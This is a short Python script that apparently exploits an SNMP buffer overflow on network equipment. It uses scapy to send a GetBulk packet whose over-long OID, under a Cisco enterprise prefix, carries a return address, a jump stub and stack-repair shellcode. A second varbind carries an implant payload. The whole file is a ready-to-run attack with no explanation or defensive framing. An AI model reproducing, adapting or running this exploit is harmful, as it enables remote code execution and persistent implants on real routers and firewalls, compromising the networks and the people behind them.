from scapy.all import *
from scapy.layers import *
import random
import binascii

ShellCode_Retn_Addr = "\x6D\xBC\x1A\x09"
ShellCode_ESP_Jump = "\x8B\x7C\x24\x14\x8B\x07\xFF\xE0"
ShellCode_Repair_Stack_Balance = "\xB8\x8C\x64\xA8\x08\x83\xEC\x04\x89\x04\x24\x89\xE5\x83\xC5\x58\x31\xC0\x31\xDB\xB3\x10\x31\xF6\xBF\xAE\xAA\xAA\xAA\x81\xF7\xA5\xA5\xA5\xA5\x60\x8B\x84\x24\xC8\x01\x00\x00\x04\x32\xFF\xD0\x61\xC3"
ShellCode_Implant_Payload = "\xBE\x60\xCE\x9B\x08\x68\x00\x90\x01\x00\xFF\xD6\x8B\xF8\xE8\x00\x00\x00\x00\x58\x83\xC0\x4D\x89\x38\xE8\x00\x00\x00\x00\x58\xBE\xB0\xBB\x16\x09\x6A\x75\x83\xC0\x47\x50\x57\xFF\xD6\xB8\x7D\x00\x00\x00\xBB\x00\x00\x66\x08\xB9\x00\x10\x00\x00\xBA\x07\x00\x00\x00\xCD\x80\xBE\xB0\xBB\x16\x09\xE8\x00\x00\x00\x00\x58\x6A\x06\x83\xC0\x12\x50\x68\x8D\x0C\x66\x08\xFF\xD6\x83\xC4\x1C\xC3\x68\x44\x33\x22\x11\xC3\x8B\x50\x0C\x89\x55\xE8\x60\xE8\x07\x00\x00\x00\x61\x68\x93\x0C\x66\x08\xC3\xE8\x00\x00\x00\x00\x5A\x83\xC2\x64\x8B\x75\xF8\x8B\x7D\x10\x80\x7E\x0C\x81\x75\x03\x83\xC6\x04\x83\x3A\x00\x74\x0B\x57\x56\x8B\xC2\xFF\xD0\x83\xC4\x08\xEB\x39\x66\x83\x7E\x0C\x08\x75\x32\x80\x7E\x17\x11\x75\x2C\x66\x83\x7E\x24\x00\x75\x25\x66\x83\x7E\x22\x00\x75\x1E\x33\xDB\x8A\x5E\x27\x8A\x7E\x26\x66\x83\xEB\x08\x53\x8B\xCE\x83\xC1\x2A\x51\x52\xB8\xB0\xBB\x16\x09\xFF\xD0\x83\xC4\x0C\xC3"

if __name__ == '__main__':
    head_ovf = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    oidLen_ovf = 82 + len(ShellCode_Retn_Addr) + len(ShellCode_ESP_Jump)
    wapper_1 = []
    wapper_2 = []
    wapper_3 = []
    for byte in ShellCode_Repair_Stack_Balance:
    	wapper_1.append(str(ord(byte)))
    for byte in ShellCode_Retn_Addr:
    	wapper_2.append(str(ord(byte)))
    for byte in ShellCode_ESP_Jump:
    	wapper_3.append(str(ord(byte)))
    oid_ovf = ".".join(wapper_1) + ".19" * (82 - len(ShellCode_Repair_Stack_Balance)) + ("." + ".".join(wapper_2) + "." + ".".join(wapper_3))
    
    print oid_ovf
 
    head_1 = "1.3.6.1.2.1.1.1"
    oid_1 = ShellCode_Implant_Payload 

    overflow = head_ovf + "." + str(oidLen_ovf) + "." + oid_ovf

    print ""
    print "head length : %d" % len(head_ovf.split('.'))
    print "oid length : %d" % len(oid_ovf.split('.'))
    print "overflow length : %d" % len(overflow.split('.'))

    try:
        snmpBulk = SNMPbulk(id=random.randint(0x80000, 0x1fffffff), max_repetitions=1,
	         varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1"), value=ASN1_STRING(oid_1)),
	                                                                                 SNMPvarbind(oid=ASN1_OID(overflow))])
        snmp = SNMP(PDU=snmpBulk, community="public")

        packet = IP(src='192.168.1.3', dst='192.168.1.1') / UDP(dport=161, sport=12345) / snmp
        send(packet)
        #packet.show()
    except Exception, e:
    	print e
